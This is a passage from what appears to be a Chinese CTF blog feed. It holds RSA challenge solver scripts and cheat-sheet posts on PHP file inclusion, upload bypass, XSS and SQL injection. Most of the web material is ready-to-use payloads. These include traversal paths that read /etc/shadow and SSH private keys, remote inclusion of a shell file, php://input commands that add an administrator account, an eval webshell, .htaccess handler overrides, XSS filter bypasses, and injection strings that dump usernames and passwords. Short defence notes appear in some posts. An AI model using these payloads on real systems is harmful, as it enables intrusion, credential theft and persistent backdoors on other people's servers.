2d5d2e7ac376707d76601840c6aa9af27df6845733b9e53982a8f8119c455c9c3d5df1488721194a8392b8a97ce6e783e4ca3b715918041465bb2132a1d22f5ae29dd2526093aa505fcb689d8df5780fa1748ea4d632caed82ca923758eb60c3947d2261c17f3a19d276c2054b6bf87dcd0c46acf79bff2947e1294a6131a7d8c786bed4a1c0b92a4dd457e54df577fb625ee394ea92b992a2c22e3603bf4568b53cceb451e5daca52c4e7bea7f20dd9075ccfd0af97f931c0703ba8d1a7e00bb010437bb4397ae802750875ae19297a7d8e1a0a367a2d6d9dd03a47d404b36d7defe8469print n2s(pow(c,d,n)) 第五题e=2 的情况 已知 PUBLIC KEY 和 flag.enc 求出 n e123456from Crypto.PublicKey import RSA pub = RSA.importKey(open('pubkey.pem').read())n = long(pub.n)e = long(pub.e)print 'n:%d'%nprint 'e:%d'%e 利用 n 算出 p q factor(十进制..)1234yafu-x64.exe factor(87924348264132406875276140514499937145050893665602592992418171647042491658461) p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239 python 代码如下：123456789101112131415161718192021代码如下：#!/usr/bin/env python# -*- coding: utf-8 -*-from libnum import n2s,s2nimport gmpy2f = open('flag.enc','r')c = f.read()c = s2n(c)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = p*qr = pow(c,(p+1)/4,p)s = pow(c,(q+1)/4,q)a = gmpy2.invert(p,q)b = gmpy2.invert(q,p)x =(a*p*s+b*q*r)%ny =(a*p*s-b*q*r)%nprint n2s(x%n)print n2s((-x)%n)print n2s(y%n)print n2s((-y)%n) 第六题Extremely hard RSA 已知 PUBLIC KEY 和 flag.enc N 非常大，e=3 求出 n e123456789from Crypto.PublicKey import RSA pub = RSA.importKey(open('pubkey.pem').read())n = long(pub.n)e = long(pub.e)print 'n:%d'%nprint 'e:%d'%en:721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241e:3 公钥中，e=3，N非常大。所以可以不断地c+N然后开三次方，直接写代码爆破，不过python单线程有点长，跑了将近30分钟。 python代码如下：123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-from libnum import s2n,n2sfrom gmpy2 import irootn = 721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241e = 3f = open('flag.enc','rb')c= f.read()c = s2n(c)f.close()i = 118719480while 1: res = iroot(c+i*n,3) if(res[1] == True): print res[0] break print "i="+str(i) i = i+1print n2s(res[0])#i=118719487 第七题共模攻击(hard RSA) 已知rsa.txt 当 n 不变的情况下，知道 n e1 e2 c1 c2 可以在不知道 d1 d2 的情况下，解出 m首先找到两个 e 是互质的,能够找到 s1,s2 1e1*s1 + e2*s2 = 1 根据一系列推算，可以算出明文 m1m = c1^s1*c2^s2 mod N 判断是否互质12345def gcd(a,b): if a%b == 0: return b else : return gcd(b,a%b) #判断是否互质 找出互质的两个数123456789101112import redata=open('rsa.txt','r').read()e=re.compile(r'zks(.*?)zks').findall(data) #把文件中的：改成zksdef gcd(a,b): if a%b == 0: return b else : return gcd(b,a%b)for i in e: for j in e: if gcd(int(i.replace('L',''),16),int(j.replace('L',''),16))==1: print i,j,int(i.replace('L',''),16),int(j.replace('L',''),16) python代码如下：12345678910111213141516171819202122232425262728293031323334353637代码如下：# -*- coding: utf-8 -*-from gmpy2 import invertfrom libnum import n2sdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def main(): n = 116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211 c1 = 78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853 c2 = 98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201 e1 = 1804229351 e2 = 17249876309 s = egcd(e1, e2) s1 = s[1] s2 = s[2] # 求模反元素 if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n #m=hex(m).replace('0x','') #print m.decode('hex') print n2s(m) if __name__ == '__main__': main() 第八题已知veryhardRSA.rar 首先分析加密脚本，先判断下是否够 512-11 位，不够的随机补全。然后就是使用相同的 N，不同的 e,加密相同的数据，所以想到了共模攻击。 python代码如下： 1234567891011121314151617181920212223242526272829代码如下：#!/usr/bin/env python# -*- coding: utf-8 -*-from libnum import n2s,s2nfrom gmpy2 import invertn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)fo1 = open('flag.enc1', 'rb')fo2 = open('flag.enc2', 'rb')datafo1 = fo1.read()c1 = s2n(datafo1)fo1.close()datafo2 = fo2.read()c2 = s2n(datafo2)fo2.close()c2 = invert(c2,n)e1 = 17e2 = 65537s = egcd(e1,e2)s1 = s[1]s2 = s[2]s2 = - s2m = pow(c1, s1, n) * pow(c2, s2, n) % nprint n2s(m)]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2017%2F12%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常见的文件包含漏洞利用 文件包含漏洞介绍PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 最常见的就属于本地文件包含（Local File Inclusion）漏洞了。我们来看下面一段 index.php 代码:12345if ($_GET['func']) &#123; include $_GET['func'];&#125; else &#123; include 'default.php';&#125; 程序的本意可能是当提交 url 为 http://example.com/index.php?func=add.php时，调用 add.php 里面的样式内容和功能。直接访问 http://example.com/index.php 则会包含默认的 default.php那么问题来了，如果我们提交http://example.com/index.php?func=upload/pic/evil.jpg ，且 evil.jpg 是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的 php 代码，那么恶意的代码就会被引入当前文件执行。 普通本地文件包含1&lt;?php include("inc/" . $_GET['file']); ?&gt; 1）、包含同目录下的文件：1?file=.htaccess 2）、目录遍历：123?file=../../../../../../../../../var/lib/locate.db?file=../../../../../../../../../var/lib/mlocate/mlocate.db（linux 中这两个文件储存着所有文件的路径，需要 root 权限） 3）、包含错误日志：1?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为""来使 payload 进入日志） 4）、获取 web 目录或者其他配置文件：1?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf 5）、包含上传的附件：1?file=../attachment/media/xxx.file 6）、读取 session 文件：12?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7（session 文件一般在 /tmp 目录下，格式为 sess_[your phpsessid value]，有时候也有可能在 /var/lib/php5 之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值，也许你能够获得一个 shell） 7）、如果拥有 root 权限还可以试试读这些东西：1234567891011/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_rsa.keystore/root/.ssh/id_rsa.pub/root/.ssh/known_hosts/etc/shadow/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]* (文件标识符)/proc/mounts/proc/config.gz 有限制的本地文件包含1&lt;?php include("inc/" . $_GET['file'] . ".htm"); ?&gt; 1）、%00 截断：12?file=../../../../../../../../../etc/passwd%00(需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效) 2）、%00 截断目录遍历：12?file=../../../../../../../../../var/www/%00(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) 3）、路径长度截断：12?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.(php 版本小于 5.2.8(?)可以成功，linux 需要文件名长于 4096，windows 需要长于 256) 4）、点号截断：12?file=../../../../../../../../../boot.ini/………[…]…………(php 版本小于 5.2.8(?)可以成功，只适用 windows，点号需要长于 256) 普通远程文件包含1&lt;?php include($_GET['file']); ?&gt; 1）、远程代码执行：12?file=[http|https|ftp]://example.com/shell.txt(需要 allow_url_fopen=On 并且 allow_url_include=On) 2）、利用 php 流 input：12345?file=php://input&lt;?php system('whoami');?&gt;&lt;?php system('net user zks zks123 /add');?&gt;&lt;?php system('net localgroup administrators zks /add');?&gt; (需要 allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php) 3）、利用 php 流 filter：1?file=php://filter/convert.base64-encode/resource=index.php 4）、利用 data URIs：123?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==&lt;?php phpinfo(); 注意没有&gt;闭合 有就无法执行(需要allow_url_include=On) 5）、利用 XSS 执行任意代码：12?file=http://127.0.0.1/path/xss.php?xss=phpcode(需要 allow_url_fopen=On，allow_url_include=On 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -) 6）、phar 协议 phar 是将 php 文件归档到一个文件包里面(我理解是类似与 zip 压缩包一样)创建 phar 的时候要注意 php.ini 的参数,phar.readonly 设置为 off（本地测试的两个默认都是 off）此方法使用要 php&gt;5.3.0首先上传一个包含有一句话木马的压缩包，通过伪协议解析其中的木马文件第一步木马生成压缩包 &lt;?php @eval($_POST[1]);?&gt;第二步将压缩包上传第三步解析压缩包中的文件 利用 zip 或 phar 伪协议读取压缩包中的文件12/about.php?f=phar://./images/1499394959.jpg/1.php/about.php?f=zip://./images/1499394959.jpg%231.php 上传webshell完成 有限制的远程文件包含123456&lt;?php include($_GET['file'] . ".htm"); ?&gt;?file=http://example.com/shell?file=http://example.com/shell.txt??file=http://example.com/shell.txt%23(需要 allow_url_fopen=On 并且 allow_url_include=On)?file=\evilshare\shell.php (只需要 allow_url_include=On) 文件包含漏洞防御：设置 open_basedir 将用户可操作的文件限制在某目录下]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传绕过]]></title>
    <url>%2F2017%2F12%2F18%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[常见的文件上传绕过归纳 上传绕过1）、绕过 JavaScript 代码检测 一般情况下 选择文件还没点击上传 就出错直接用 burpsuite 抓包 上传 jpg 后缀改成 php 后缀即可 2）、MIME 类型绕过 上传 php 后缀 改 Content-Type 即可 改成图片类型 image/jpeg image/gif 3）、目录路径检测 %00 截断 通过抓包截断将 evil.php.jpg 后面的一个.换成 0x00或者通过抓包将 evil.php .gif 后面的空格改成 00 即可 example: 4）、文件扩展名检测绕过（黑名单） 文件大小写 Asp phP ASASPP phphppAsp: asa cer cdxAspx: ashxPHP: php3、php4、php5、phtml、pht 5）、文件内容检测 头文件加 GIF89a 后面加一句话，其他名字可以改成 php。或者直接在一个正常的 gif 后面加一句话6）、上传覆盖 .htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。123&lt;FilesMatch "x.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后在相同目录下上传 x.jpg 就可以解析 php 了。 或者后面就上传了一个 .htaccess 文件里面只有一句。1AddType application/x-httpd-php .abc 之后，把 php 后门改成 xx.abc 上传上去就可以执行了。 7）、上传.user.ini 如果文件夹下有Index.php .user.ini 1.gif我们在 .user.ini 里面写入1auto_prepend_file=/tmp/01.gif 在 1.gif 写入 php 一句话 这样访问 php 文件即可 不需要重启 apache 修改 php.ini1auto_prepend_file=/tmp/01.gif 不过需要重启apache服务器 8）、配合文件包含漏洞12&lt;?php include('x.jpg');?&gt;x.jpg写入一句话&lt;?php eval($_POST[1]);?&gt; 即可' 9）、解析漏洞12345678901、 IIS 6.0shell.asp;1.jpgshell.asp/1.jpg02、IIS 7 or Nginxshell.jpg/x.phpshell.jpg%00.php03、Apache2shell.php.bakShell.php.rar 10）、其他绕过 01.上传 123.php:jpg，会生成 123.php 空文件，然后上传 123.&lt;&lt;&lt;，即可覆盖 123.php，把 Shell 内容写入 123.php 文件。 02.直接上传 Shell.php::$DATA 03.用 Burpsuite 拦截 将上传文件名改成 Shell.php%81 即可。 上传漏洞防护1）、文件上传的目录设置为不可执行 只要 web 容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。 2）、判断文件类型 在判断文件类型时，可以结合使用 MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的 HTML 代码。 3）、使用随机数改写文件名和文件路径 文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。 4）、单独设置文件服务器的域名 由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS归纳]]></title>
    <url>%2F2017%2F12%2F17%2FXSS%E5%BD%92%E7%BA%B3%2F</url>
    <content type="text"><![CDATA[常见的 xss 归纳 类型1）、反射型2）、存储型3）、dom-xss 突破xss的防御关键字过滤 关键字不允许 关键字转义 常规插入123456&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;script&gt;confirm(/xss/)&lt;/script&gt;&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 47, 88, 83, 83, 47, 41))&lt;/script&gt;&lt;img src=1 onerror=alert(/xss/)&gt; script 被过滤123456789&lt;Script&gt;alert(/xss/)&lt;/Script&gt; &lt;scRiPt&gt;alert(/xss/);&lt;/scrIPt&gt;&lt;audio src=x onerror=prompt(1);&gt; &lt;audio/src=x onerror=prompt(1);&gt;&lt;scr&lt;script&gt;ipt&gt;alert(/XSS/)&lt;/scr&lt;script&gt;ipt&gt;&lt;img src=1 onerror=alert(/xss/)&gt; &lt;img/src=aaa.jpg onerror=prompt(1)&gt;&lt;video src=x onerror=prompt(1);&gt; &lt;video/src=x onerror=prompt(1);&gt; on 标签1234567&lt;div onclick="alert(/xss/)"&gt; &lt;div onclick=alert(/xss/)&gt;&lt;div onclick ="alert(/xss/)"&gt; 多一个空格 &lt;svg/onload=prompt(1);&gt;&lt;textarea autofocus onfocus=alert(1)&gt;onload onmouseenter onmouseup onmousedown onmousemoveonmouseout onmouseover onmouseleave onkeydown onkeypress onkeyup 常见的绕过123456789101112&lt;q/oncut=alert(1)&gt; // &lt;a href="javascript:alert(1)"&gt;Clickme&lt;/a&gt;&lt;a href=javascript:alert(1)&gt; &lt;body/onpageshow=alert(1);&gt;&lt;q/oncut=\u0061lert(1)&gt; // &lt;%0ascript&gt;alert(1);&lt;/script&gt;&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;iframe src="javascript:alert(2)"&gt; &lt;a href="javascr ipt:alert(1);"&gt;click&lt;/a&gt; &lt;marquee/onstart=confirm(2)&gt; &lt;a href="javasc ript:alert(1);"&gt;click&lt;/a&gt;&lt;img src="x" onerror="alert(1)"&gt; base64 编码绕过123&lt;a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&gt;test&lt;/a&gt;&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;&lt;iframe/src="data:text/html; base64 ,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== "&gt; 隐藏标签绕过123456789uid=1 accesskey=x onclick="alert(1)" // 火狐浏览器 alt shift + x 同时按可以触发uid="test" type="text" onfocus="alert(1)" autofocus a=""// type 在 value 后面才行example：&lt;form&gt; First name:&lt;br&gt;&lt;input type="hidden" name="firstname" value=""accesskey=x onclick="alert(1)" //"&gt; Last name:&lt;br&gt;&lt;input name="lastname" value="test" type="text" onfocus="alert(1)" autofocus a="" type="hidden"// &lt;/form&gt; xss 防护1）、控制输入输出 过滤一些关键字 诸如 alert script prompt img src on 等。 2）、对一些特殊字符进行转义诸如将 “ , ‘ , &amp; ,&lt; ,&gt; 等转化为 HTML 实体。 预定义字符如下：12345&amp; 转义为 &amp;amp" 转义为 &amp;quot' 转义为 &amp;#039&lt; 转义为 &amp;lt&gt; 转义为 &amp;gt 3）、最好是设置白名单 规定哪些标签、哪些字符可以输出。 4）、设置 HttpOnly 虽然它对 xss 漏洞不起作用，但是能够防止后期的 cookie 劫持攻击。]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入学习]]></title>
    <url>%2F2017%2F12%2F16%2FSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SQL注入一些归纳 数据库判断ACCESS123and (select count (*) from sysobjects)&gt;0 返回异常and (select count (*) from msysobjects)&gt;0 返回异常and asc(chr(97))=97 是否access数据库 判断方法：在网址最后输入（’；），返回不正常的时候，说明是 access 类型的。反之，则是 mssql 类型的。 SQLSERVER1234and (select count (*) from sysobjects)&gt;0 返回正常and (select count (*) from msysobjects)&gt;0 返回异常and left(version(),1)=5%23 //红色字体也可能是4and exists(select id from sysobjects) MYSQL123id=2 and version()&gt;0 返回正常id=2 and length(user())&gt;0 返回正常id=2 and char(49) 返回正常 Oracle1and length (select user from dual)&gt;0 返回正常 数据类型判断整型1231' --对应查询语句 select * form users WHERE id=1' LIMIT 0,11 and 1=11 and 1=2 字符串型1231' --对应查询语句 select * form users WHERE id='1'' LIMIT 0,1 1' and '1'='1 1' and '1'='2 搜索型1231' --对应查询语句 select * form users WHERE id='%1'%' LIMIT 0,11%' and '%'='1%' and '%'='123 数据库类型及其注释符 Sql注入常用的工具1）啊D ，适用 Access/Mssql2）Pangolin3）Sqlmap4）AWVS5）AppScan 一般较为常用的是1）2）3） sqlmap的使用方法1234567891011121314151617181920Sqlmap –u "url" --dbs 查询所有数据库Sqlmap –u "url" --current-db 查看当前数据库Sqlmap –u "url" --users 查看所有用户Sqlmap –u "url" --current-user 查看当前用户Sqlmap –u "url" –D 数据库 --tables 查看数据库里面的所有表Sqlmap –u "url" –D 数据库 –T 表 --columns 查看表里面所有的列Sqlmap –u "url" –D 数据库 –T 表 –C 列1,列2 --dump 查看所有数据Sqlmap –r post.txt --dbs post型注入Sqlmap –u "url" --data="id=1" -f --banner --dbs --users post 转化成 get--flush-session 把之前的结果清空，否则会影响判断得结果--is-dba 查看是否有数据库管理员权限--tamper "space2randomblank.py" 绕过脚本-p 关键字 或者在关键字加* 表示要检测的注入点space2randomblank.py 空格替换成%09randomcase.py 大小写unmagicquotes.py 宽字节 %bfrandomcomments.py 随机分割关键词versionedmorekeywords.py 注释绕过space2comment.py 空格替换为/**/sqlmap –u "xx" --tamper "space2comment.py" --level 3 --risk 3 mysql 手工注入显错注入1234567891011121314判断类型And+1=1%23 或者 or+1=1%23判断列数?id=1'+order+by+2%23判断数据回显的位置?id=1'+union+select+1,2%20%23获取数据库名?id=1'+union+select+1,database()%23获取数据库中的表名?id=1'+union+select+1,table_name+from+information_schema.tables+where+table_schema=0x64767761%23获取数据库中表的列名?id=1'+union+select+1,column_name+from+information_schema.columns+where+ table_name=0x7573657273%23获取数据库表中列字段的值?id=1'union+select+1,group_concat(user,0x7E237E,password)+from+users%23 报错注入常见的拼接方式： and、or、&amp;&amp;、|| 利用 exp() 函数报错注入1exp(~(select * FROM(SELECT USER())a)); 报错查询语句： 1?id= 1' and exp(~(select * FROM(SELECT USER())a))--+ 利用 extractvalue() 函数报错注入1extractvalue(1,concat(0x7e,(select user()),0x7e)) 获取数据库名1?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ 获取数据库中的表名1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))--+ 获取数据库中表的列名1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),0x7e))--+ 获取数据库表中列字段的值1?id=1' and extractvalue(1,concat(0x7e,(select concat(id,'~',username,'~',password) from security.users limit 2,1 ),0x7e))--+ 利用 updatexml 函数报错注入 报错查询语句：1updatexml(1,concat(0x7e,(select user()),0x7e),1) 获取数据库名1?id= 1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 获取数据库中的表名1?id= 1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) --+ 获取数据库中表的列名1?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' ),0x7e),1) --+ 获取数据库表中列字段的值1?id=1' and updatexml(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 2,1 ),0x7e),1) --+ 利用 floor 函数报错注入 报错查询语句：1?id=1' union select 1,2,3%23 获取数据库名1?id=1' union select count(*),1, concat('~',(select database()),'~', floor(rand()*2)) as a from information_schema.tables group by a%23 获取数据库中的表名1?id=1' union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23 获取数据库中表的列名123?id=1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23获取数据库表中列字段的值?id=1' union select count(*),1, concat('~',(select concat(id,'~',username,'~',password) from security.users limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23 布尔型盲注应用程序仅仅返回 True（页面）和 False（页面）。先判断数据库长度试试1?id=1' and length(database())=8%23 left() 函数：得到字符串左部指定个数的字符 语法：left (string,n) string 为要截取的字符串，n 为长度12?id=1' and left(database(),1)='d'--+?id=1' and left(database(),2)='dv'--+ substr() 函数：截取指定长度的字符串。 语法： string substr(string, start, length) 第一个参数为要处理的字符串，start 为开始位置，length 为截取的长度 举例：12?id=1' and substr(database(),1,1)='d'--+ '?id=1' and substr(database(),2,1)='v’--+ ASCII() 函数12?id=1' and ascii(substr(database(),1,1))=100--+?id=1' and ascii(substr(database(),2,1))=118--+ ord() 函数：返回字符串第一个字符的 ASCII 值12?id=1‘ and ord(substr(database(),1,1))=100--+?id=1‘ and ord(substr(database(),1,1))=100--+ mid() 函数：截取字符串指定长度的字符串语法： MID(column_name,start[,length]) column_name 为要提取字符的字段，start 为开始截取位置(起始值是1)，length 为截取的长度(可选，默认余下所有字符) 举例：1234?id=1' and MID(DATABASE(),1,1)='d' --+?id=1' and MID(DATABASE(),2,1)='v' --+?id=1' and ord(MID(DATABASE(),1,1))=100 --+?id=1' and ord(MID(DATABASE(),2,1))=118 --+ regexp ：正则表达式 语法： regexp ^[a-z] 表示字符串中第一个字符是在 a-z范围内。 regexp ^a 表示字符串第一个字符是a。 regexp ^ab 表示字符串前两个字符是ab。 举例：12?id=1' and database() regexp '^d' --+?id=1' and database() regexp '^dv' --+ like：与正则表达式类似 语法： Like ‘%a’表示字符串第一个字符是a。 Like ‘%ab’表示字符串前两个字符是ab。 举例：12?id=1' and database() like 'd%' --+?id=1' and database() like 'dv%' --+ if()函数：判断函数，并根据判断结果返回特定值。语法： if(判断条件,正确返回的值,错误返回的值) 举例：123456789if()函数可以和前面提到的函数结合使用?id=1' and 1=if(前面提到的注入语句,1,0) --+?id=1' and 1=if(left(database(),1)='d',1,0) --+?id=1' and 1=if(substr(database(),1,1)='d',1,0) --+?id=1' and 1=if(ascii(substr(database(),1,1))=100,1,0) --+?id=1' and 1=if(MID(DATABASE(),1,1)='d',1,0) --+?id=1' and 1=if(ord(MID(DATABASE(),1,1))=100,1,0) --+?id=1' and 1=if(database() regexp '^d',1,0) --+?id=1' and 1=if(database() like 'd%',1,0) --+ 基于时间型盲住时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时语句来构造如果 web 页面的返回值只有一种，true，无论输入任何值，它的返回都会按正确的来处理时间型盲注语句判断数据库长度 12345678910uname=a&amp;passwd=a") or if(length(database())=7, sleep(5),0) #uname=a&amp;passwd=a") or if(length(database())=8, sleep(5),0) #?id=1' and if(left(database(),1)='s',sleep(3),0)--+?id=1' and 1=if(left(database(),1)='d',sleep(3),0) --+?id=1' and 1=if(substr(database(),1,1)='d',sleep(3),0) --+?id=1' and 1=if(ascii(substr(database(),1,1))=100,sleep(3),0) --+?id=1' and 1=if(MID(DATABASE(),1,1)='d',sleep(3),0) --+?id=1' and 1=if(ord(MID(DATABASE(),1,1))=100,sleep(3),0) --+?id=1' and 1=if(database() regexp '^d',sleep(3),0) --+?id=1' and 1=if(database() like 'd%',sleep(3),0) --+ 已知 flag 表求 flag 字段123?id=1' and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and '1'='1?id=1' and (select case when (select ord(substring(flag from 1 for 1)) from flag limit 1) = 2 then sleep(5) else 1 end) and '1'='1?id=1' and exists(select flag from flag) and sleep(5) and '1' = '1 宽字节注入text/html; charset=gb2312 简体中文 判断是宽字节注入 获取数据库名1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,database()%23 获取数据库中的表名1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 获取数据库中表的列1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7361655F757365725F73716C6934%23 获取数据库表中列字段的值1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(id,0x7e,title_1,0x7e,content_1),3 from mydbs.sae_user_sqli4 %23 limit注入发现回显会多一个”,1”，并且”1”由 num 参数控制。并且不加 num 参数不提供报错，由此想到 limit 注入。limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入代码)),1) 语法：1SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select 